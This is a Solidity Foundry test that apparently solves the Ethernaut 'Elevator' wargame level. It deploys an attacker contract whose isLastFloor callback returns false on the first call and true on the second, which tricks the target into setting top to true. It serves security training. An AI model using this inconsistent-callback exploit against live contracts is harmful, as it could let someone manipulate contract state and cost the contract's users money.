// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level11.sol";
import "forge-std/Test.sol";

contract ExploitLevel11 is Test {
    Elevator instance = new Elevator();
    AttackElevator attackInstance;

    function testExploit() external {
        attackInstance = new AttackElevator(instance);
        attackInstance.attack();
        console.log("top:", instance.top());
        assertEq(instance.top(), true);
    }
}

contract AttackElevator {
    bool alreadyCalled;
    Elevator instance;

    constructor(Elevator _instance) {
        instance = _instance;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!alreadyCalled) {
            alreadyCalled = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        instance.goTo(100);
    }
}
